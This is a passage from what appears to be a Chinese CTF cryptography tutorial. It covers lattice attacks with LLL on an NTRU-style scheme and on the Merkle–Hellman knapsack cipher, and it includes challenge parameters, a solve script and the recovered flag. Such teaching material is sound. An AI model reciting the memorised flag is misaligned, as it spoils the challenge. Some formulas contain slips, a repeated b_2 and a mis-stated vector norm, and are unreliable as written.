24445829856673933058683889356407393860808522483552243481673407476395441107312130500945533047834993780864465577896968035259377721441466959027298166974554621753030728893320770628116412892838297326949997096948374940319126319050202262831370086992122741039059235809755486170276098658609363789670834482459758766315965501103856358827004129316458293962968758091319313119139703281758409686502729987426264868783862562150543872477975124482520151991822540312287812454562890993596447391870392038170902308036014733295394468384998808411243690466996284064331048659179342050962003962851315539367769981491650514319735943099663094899893</span><br><span class="line">h = 4913183942329791657370364901346185016154546804260113829799181697126245901054001842015324265348151984020885129647620152505641164596983663274947698263948774663097557712000980632171097748594337673511102227336174939704483645747401790373320060474777199502879236509921155985395351647045776678540066383822814858118010995298071799515355111562392871675582742450331679030377003011729873888234401630551097244308473512890467393558048369156638425711104036276296581364374424105121033213701940135560177615395895359023414249846471332180098181632276243857635719541258706892559869642925945927703702696983949003370155033272664851406633</span><br><span class="line">c = 23952867341969786229998420209594360249658731959635047659110331734424497403162506614140213749790708068086973241468969253395309243550869149482017583754015801740198734485871141965939993554966887039832701333623276590311516052334557237678750680087492306461195312290860900992532859827406262394480605001436094705579158919540851727801502678160085863180222123880690741582667929660533985778430252783414931317574267109741748071838599712027351385462245528001743693258053631099442571041984251010436099847588345982312217135023484895981833846397834589554744611429133085987275209019352039744743479972391909531680560125335638705509351</span><br><span class="line">'''</span><br></pre></td></tr></table></figure>



<p>题解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = 24445829856673933058683889356407393860808522483552243481673407476395441107312130500945533047834993780864465577896968035259377721441466959027298166974554621753030728893320770628116412892838297326949997096948374940319126319050202262831370086992122741039059235809755486170276098658609363789670834482459758766315965501103856358827004129316458293962968758091319313119139703281758409686502729987426264868783862562150543872477975124482520151991822540312287812454562890993596447391870392038170902308036014733295394468384998808411243690466996284064331048659179342050962003962851315539367769981491650514319735943099663094899893</span><br><span class="line">h = 4913183942329791657370364901346185016154546804260113829799181697126245901054001842015324265348151984020885129647620152505641164596983663274947698263948774663097557712000980632171097748594337673511102227336174939704483645747401790373320060474777199502879236509921155985395351647045776678540066383822814858118010995298071799515355111562392871675582742450331679030377003011729873888234401630551097244308473512890467393558048369156638425711104036276296581364374424105121033213701940135560177615395895359023414249846471332180098181632276243857635719541258706892559869642925945927703702696983949003370155033272664851406633</span><br><span class="line">c = 23952867341969786229998420209594360249658731959635047659110331734424497403162506614140213749790708068086973241468969253395309243550869149482017583754015801740198734485871141965939993554966887039832701333623276590311516052334557237678750680087492306461195312290860900992532859827406262394480605001436094705579158919540851727801502678160085863180222123880690741582667929660533985778430252783414931317574267109741748071838599712027351385462245528001743693258053631099442571041984251010436099847588345982312217135023484895981833846397834589554744611429133085987275209019352039744743479972391909531680560125335638705509351</span><br><span class="line">b = 2^1024</span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ, [[1, b*h],</span><br><span class="line">                [0, b*p]])</span><br><span class="line"></span><br><span class="line">f, bg = L.LLL()[0]</span><br><span class="line">f, g = abs(f),abs(bg)//b</span><br><span class="line"></span><br><span class="line">m = (f*c) % p % g * inverse_mod(f, g) % g</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"># flag{7c95453a-e577-40d8-9ad0-993655b83b69}</span><br></pre></td></tr></table></figure>



<p>缩放因子 b 的作用： </p>
<p> f ≈ 2¹⁵³⁵，g ≈ 2⁵¹¹，直接构造 (f, g) 时，分量数量级差异大（2¹⁵³⁵ vs 2⁵¹¹），LLL可能无法有效识别短向量。  引入 b = 2¹⁰²⁴ 后，b·g ≈ 2¹⁵³⁵，与 f 的尺寸相当，平衡分量数量级，使得向量 (f, b·g) 的范数更小，易被LLL识别。</p>
<h2 id="Wixrt">2、背包密码</h2>
参数：

<p>私钥为一个超递增序列<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.344ex" height="1.355ex" role="img" focusable="false" viewbox="0 -441 1036.3 598.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g></g></g></g></svg></mjx-container>，满足</p>
<pre><code>                                                     $ a_i &gt; \sum_{k=1}^{i-1} a_k $   
</code></pre>
<p>模数 m 满足</p>
<pre><code>                                                      $ m &gt; \sum_{i=1}^{n} a_i $   
</code></pre>
<p>乘数 w ，满足 gcd(w , m) = 1。</p>
<p>公钥为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="1.71ex" height="1.927ex" role="img" focusable="false" viewbox="0 -694 756 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(462,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g></g></g></g></svg></mjx-container>，满足</p>
<pre><code>                                                $ b_i \equiv w a_i \pmod{m} $   
</code></pre>
<p>加密：</p>
<p>设明文为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="10.714ex" height="1.946ex" role="img" focusable="false" viewbox="0 -666 4735.8 860"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g></g><g data-mml-node="mo" transform="translate(812,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="msub" transform="translate(1256.6,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(2346.3,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3291.1,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mn" transform="translate(944.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></g></svg></mjx-container></p>
<pre><code>                                              $ c \equiv \sum_{i=1}^{n} b_i v_i \pmod{m} $  
</code></pre>
<p>解密：</p>
<pre><code>                                        $ \boldsymbol{v} = w^{-1}c \equiv \sum_{i=1}^{n} v_i a_i \pmod{m} $
</code></pre>
<p>构造格：</p>
<pre><code>                                      $ L = \begin{bmatrix}
</code></pre>
<p>1 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 &amp; b_1 \<br>0 &amp; 1 &amp; 0 &amp; \cdots &amp; 0 &amp; b_2 \<br>0 &amp; 0 &amp; 1 &amp; \cdots &amp; 0 &amp; b_2 \<br>\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \<br>0 &amp; 0 &amp; 0 &amp; \cdots &amp; 1 &amp; b_n \<br>0 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 &amp; -c<br>\end{bmatrix} $ </p>
<p>我们发现<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="20.659ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 9131.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mo" transform="translate(844.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mo" transform="translate(1900.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="msub" transform="translate(2289.6,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mo" transform="translate(3211.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="msub" transform="translate(3655.8,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mo" transform="translate(4577.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mo" transform="translate(5022,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"/></g><g data-mml-node="mo" transform="translate(6360.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="msub" transform="translate(6805.3,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(7797.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mn" transform="translate(8242.3,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(8742.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>是一个格点，因为</p>
<pre><code>                                     $ (v_1, v_2, \ldots, v_n, 1) L = (v_1, v_2, \ldots, v_n, 0) $
</code></pre>
<p>同样的，我们考虑这个向量长度</p>
<pre><code>                                                 $ \|\boldsymbol{v}\| = \sum v_i^2 &lt; \sqrt{n} $  
</code></pre>
<p><font style="color:rgb(0, 0, 0);">如果我们说这个向量会是格中的最短向量呢？（后续会解答）</font>            </p>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(b'******')</span><br><span class="line">flag = bin(flag)[2:]</span><br><span class="line">n = len(flag)</span><br><span class="line"></span><br><span class="line">a = [random.randint(1, 4**n)]</span><br><span class="line">s = a[0]</span><br><span class="line">for i in range(1, n):</span><br><span class="line">    a.append(random.randint(s+1, 4**(n+i))) # a[i] &gt; s, s表示为序列a的前i个元素之和</span><br><span class="line">    s += a[i]</span><br><span class="line"></span><br><span class="line">m = random.randint(a[-1] + 1, 2*a[-1]) # 模数m &gt; a[-1]，a[-1]表示为序列a的最后一个元素</span><br><span class="line">w = random.randint(1, m) # w &lt; m</span><br><span class="line"></span><br><span class="line">assert gcd(w, m) == 1</span><br><span class="line">b = [w*i % m for i in a] # 公钥b[i] = w*a[i] % m</span><br><span class="line"></span><br><span class="line"># 密文c = sum(b[i]*flag[i])</span><br><span class="line">c = 0 </span><br><span class="line">for i in range(len(b)):</span><br><span class="line">    c = (c + b[i]*int(flag[i]))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">'''</span><br><span class="line">b = [57784269807215443965628798883058630337281610436657935003955182881603464298832993287501269971984090068477457668905205552943179327622380728870275517647540530116318630204884506415644343683558796552661014969412141024744375023261508439868391354967410324524046414305260687629082772689575034234321651172805616019040052858013275628990646030093196494927, 2563176208544510378092334837821863608977792842672059020492548194324693134405507891231503949720398732537491765544390951208066158897127289201366769624124043549594655164434337358589981598426216893419304656019373113134084026840467294504985771527072522718737384620066634722866175313857421822142366897049083140829457346256608506165064418962230587269, 365923663112911068905435751126445624548773691312328035046464572287796713097293161059307541033181545783741994278349541273082586829531167291500533074812082727161564723332178000975100618516286544655857094920548455732053744947979027728990797291625645076933633732328268500061879911355084500414030828965444566964211532041020633048696526685318194796876, 459793646341292359775279455637321385068059779059235091658710974960977957434451398034673357451415554481722909328705247529838333203552993355047941341147652382352130162700640263350559013748998953230284605202594930155633311368730533401306754053941446279515337728199878959328004378301906609234842206264358250773421319838541325898728691502437853082167, 314107843025436458186136647169493817871314948486916283244923046209347145309769632424013079355434065827681663019631689075090981106650325843682481909606671433287983797881932976349640328692546891713616387360705284750065766249877702398674366902932344990675699049167679196024866606536318925407965054530171671850544123532983384931655553387823522137532, 317793164249649700636545698974292616753324453311065240490863453357272771836562412639002972044012152491457128751003379866068511824660181980340577226349397317934661562312420660044759147358919478684354116406178836083906207688101720554515091747424358041753211704997451350781171956193789720842726624880907050506527543891738076983237389937384142081227, 51983547085905121129551688610680742640873963765187643609643259053228855770090137223271213737202175115886849859653259606322496342788843770678662437760642989877514688952507645871753020047890456282906252716496429416505810932875866434410038401537651363351585557295589093942517940411744513101661562676168977822462637054060531637674795472344300726974, 763451558749643609971658419351082423812498987643995141653105802232870043846714471660847714475412525037805341657455195782915734000813584824506122066758765060438293884023035387982891881663843667444038304082465261049421860279699627069340178910647793992496522945135592239854190299679887518584526927015393969252666990026477911342111960957644641898536, 350976556696516622082343437462060829793966799204508622307254401903443513228350901619299588102615160622811751743472400613554088802284272766024923028269063070238505943311493320873204930315597405260541430600371039669789665123030435590337699925544039585531565563764576652973120917024702923508535187911693737090335177943573807710136113569036537036276, 181996302618539535784262913686465823375976463082806711948652958941453708773747271680186565231293007800727516626992865085922104393280224425499084080407559465083838871141612971550984338922625098305683464959760076327576238991499661175871954170749308445691693843216721191512386476527079601654618535078123541741866697209266170737808390605899676634681, 680729949479140722440255238637537690758348018938024393698630837836599404324809406416100667188408722024831010245172738540729985020274833312059947809413502074583569444533363767884136573189642298134939666736494629093726388108036776204464453467171991079057152652349781656999351356485267150437617417212797555678979178095457332271854466380413040020705, 410636803416294316856966133032268770221221290632616430049378930864126966693017330983776494062749578049433890139801658762498722383473962234264149003269057009592990089356158990910350155708025449076041798369410289728576512451263444497753827058232168102762276053576033843783440788685259919126636921484842525691242780864342549871579983224419404513041, 764810332166189775540641321688497778203544291378543607486320150041365339364262080937942726344699441833945222856382550558120748157533923448105056626948089298541953075400578043210849008721344933245774459493345509789671456232101568373310183368378217400306479629708138159462803278917575423236902887937247954723711108982101954157739717889659030086471, 286269363591432208782527075722454962359946663700026716899275844505225349880977744812605274641603476309315172388198013323454519413921852903521206975735281418368461884230170325328791896536421353748841729156650040652633843005800712527531924440530068743271003163803889022542670286511027621268399756560929625077782882260259182421174997916645104208719, 595955052929514122859705696830288429317332380518459544428319425459995457542522946938758860074709098500844155710580163026348656510069970933375480285759846332156064206562501848617973998985442435690463096078264620610385436548134480920012006575147928061971382198710007266421203594140713773633533284737432117180267226116327395537927961428441676391140, 158533620359893585467711656904896269344888397521228513498428094612645993159959260362718995679926075962046165426492477199609416758804089821981544635805720018054337106828370891624560288929125249229917823741968972661052373672598840255666918162062086207794347231606744290319889473396324078552998151566926073488637190373941024777381274309179998443197, 280857909132999933895380832650739094400924717066624937694720936222362832184471214360024858458971352891204818228894374388250056346803607309019113223578778210451567762459027409067732705297529539289979333886454627721010075156924562018786328548139682058015336230846291471873728676240268526243772892865434284963124348891922572648709025906181348981296, 127975208615055462054940021491289897522502770036983058004207729849565641193816087321522036594503703843622217766105621170351453380982006938181429842083913642600242841355088019565441144489568194661995765379602631206250171852438870208395704359587266250542758394016664021236850780542129627128186880946433585811147147301361043555337897913966253140253, 659311698488057071633082480499314565821103880396408477136213182548902108752491589901415042730811203148341041839755961858815287708037223599965525196348561364276893973554457320649877497476583774331016878951870749243793914428046170601521827702666046946207374207254828563222938087091632071339306868531584965688422619365868052195966677673333406580457, 117004928933322602165729064750967124283103806999199518249632743294853395605420817648928931647051895619733581140706294773235083019982114846594522994253722718892489333106206139976931087032288683194396145403386215770666447613813094283654310915052597214837320525190517555986656406626051316671911039365095354408769911982463682487892372426222197521752, 505395812096608402139924292799502890643267693139141029246997977831798374748921965289062529232894024086703340572396135754566593535367052090187303057122630106306512253566960239076323669311496886553122746268503468247123665843527959891742127440450725642732162780704932741105845710028924089031127760782847177004891798196027293815671866606340744350235, 499372356919260617346208298025732726324102620248956563257707058904700067464775619757808724933508666539095726310593284137555902525516700187298835432614264023688333834639054990419078113265399830785518863681873540853871435561722164365571032926154557559589867997844249585448759371022124378736125315646903528260128610323703505232156832616884565239133, 507034220958158661501035770995208460472407609006213418985832682250534939110625471209364925655291562962013086576890262839511889096778432400695627334756929039034458132234241624113905004102376460819001287283207838946071446379971639164241938891827309940826492433088510690756064900935001486947083418985944920018563756666157250703229261193604812594780, 70976738112048117790337904055639374523604836513256165099034229804740747266988113910131930554016220141543791469218295216321513066787362478605656463262276645868373286224766306076107666770608085133265986569757116997379833436759790144605871424206090481860608991918687992180201749750182118301561114482286353662661648173946270947327584627358310521383, 647480980130481321990432859685636470940564673147425736033702250227141158858570492989348513409975598775579079999889597017063077245913738601893233403077222262669585383586945325544038984530128263864360059474223887424191999708500675426723391835496773105816679408003974799739969531014437664198864765270774418460134281069709772110440787346420168161289, 757593569889675440084955970758278521137839238105406417198238835290724749074775116901371485434682795149636465523471841786332533562572831342620983070478597846281545505360233711891028858575742018577166736257117444046294383835741380606906219922367132012391640639642719742363062455673053008216516147841410378477226696927646737532469926848871964061827, 1002640660920309649261800646925923495791976550903108902201162582323479259763482446695778560808423641057082203448416409716388979719303150594502368972638727189296264384817347162786022476598777319300165232263752921222500035703740387268662303910076973072451817611554929036771126729408554657015235249513825150517579132128712085841938348250621095904699, 